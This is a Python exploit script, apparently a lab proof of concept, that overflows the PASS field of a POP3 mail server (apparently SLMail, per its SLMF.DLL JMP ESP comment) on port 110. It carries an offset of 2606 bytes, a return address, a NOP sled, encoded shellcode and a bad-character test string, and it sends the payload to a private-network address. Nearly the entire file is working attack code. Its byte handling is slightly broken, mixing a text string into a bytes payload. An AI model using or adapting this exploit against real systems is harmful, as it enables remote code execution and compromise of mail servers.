#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#buffer = ""


badchars_without_x0a_x0d_truncateORrender = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


buf =  b""
buf += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\xb2\x7a\x22\xb0\x83\xee\xfc\xe2\xf4"
buf += b"\x4e\x92\xa0\xb0\xb2\x7a\x42\x39\x57\x4b\xe2\xd4"
buf += b"\x39\x2a\x12\x3b\xe0\x76\xa9\xe2\xa6\xf1\x50\x98"
buf += b"\xbd\xcd\x68\x96\x83\x85\x8e\x8c\xd3\x06\x20\x9c"
buf += b"\x92\xbb\xed\xbd\xb3\xbd\xc0\x42\xe0\x2d\xa9\xe2"
buf += b"\xa2\xf1\x68\x8c\x39\x36\x33\xc8\x51\x32\x23\x61"
buf += b"\xe3\xf1\x7b\x90\xb3\xa9\xa9\xf9\xaa\x99\x18\xf9"
buf += b"\x39\x4e\xa9\xb1\x64\x4b\xdd\x1c\x73\xb5\x2f\xb1"
buf += b"\x75\x42\xc2\xc5\x44\x79\x5f\x48\x89\x07\x06\xc5"
buf += b"\x56\x22\xa9\xe8\x96\x7b\xf1\xd6\x39\x76\x69\x3b"
buf += b"\xea\x66\x23\x63\x39\x7e\xa9\xb1\x62\xf3\x66\x94"
buf += b"\x96\x21\x79\xd1\xeb\x20\x73\x4f\x52\x25\x7d\xea"
buf += b"\x39\x68\xc9\x3d\xef\x12\x11\x82\xb2\x7a\x4a\xc7"
buf += b"\xc1\x48\x7d\xe4\xda\x36\x55\x96\xb5\x85\xf7\x08"
buf += b"\x22\x7b\x22\xb0\x9b\xbe\x76\xe0\xda\x53\xa2\xdb"
buf += b"\xb2\x85\xf7\xe0\xe2\x2a\x72\xf0\xe2\x3a\x72\xd8"
buf += b"\x58\x75\xfd\x50\x4d\xaf\xb5\xda\xb7\x12\x28\xb0"
buf += b"\xb0\x75\x4a\xb2\xb2\x59\x0b\x39\x54\x10\x32\xe6"
buf += b"\xe5\x12\xbb\x15\xc6\x1b\xdd\x65\x37\xba\x56\xbc"
buf += b"\x4d\x34\x2a\xc5\x5e\x12\xd2\x05\x10\x2c\xdd\x65"
buf += b"\xda\x19\x4f\xd4\xb2\xf3\xc1\xe7\xe5\x2d\x13\x46"
buf += b"\xd8\x68\x7b\xe6\x50\x87\x44\x77\xf6\x5e\x1e\xb1"
buf += b"\xb3\xf7\x66\x94\xa2\xbc\x22\xf4\xe6\x2a\x74\xe6"
buf += b"\xe4\x3c\x74\xfe\xe4\x2c\x71\xe6\xda\x03\xee\x8f"
buf += b"\x34\x85\xf7\x39\x52\x34\x74\xf6\x4d\x4a\x4a\xb8"
buf += b"\x35\x67\x42\x4f\x67\xc1\xd2\x05\x10\x2c\x4a\x16"
buf += b"\x27\xc7\xbf\x4f\x67\x46\x24\xcc\xb8\xfa\xd9\x50"
buf += b"\xc7\x7f\x99\xf7\xa1\x08\x4d\xda\xb2\x29\xdd\x65"


#ret = 5f4a358f FFE4 JMP_ESP SLMF.DLL
#buffer = "A" * 2606 + "B" * 4 + "C" * (3500-2606-4)
#buffer = "A" * 2606 + "B" * 4 + badchars_without_x0a_x0d_truncateORrender

#RET = '\x8f\x35\x4a\x5f'
RET = b'\x8f\x35\x4a\x5f'

#buffer = "A" * 2606 + RET + 16 * '\x90' + buf + "C" * (3500-2606-4-16-348)
buffer = b"A" * 2606 + RET + b"\x90" * 16 + buf + b"C" * (3500 - 2606 - 4 - 16 - len(buf))

try:
    print("\nSending malicious buffer...")
    connect = s.connect(("10.0.2.15",110))
    data = s.recv(1024)
    s.send(b'USER username' + '\r\n')
    data = s.recv(1024)
    s.send(b'PASS' + buffer + b'\r\n')
    print("\nDone!")
except:
    print ("\nCould not connect to POP3 server! Error: {e}")
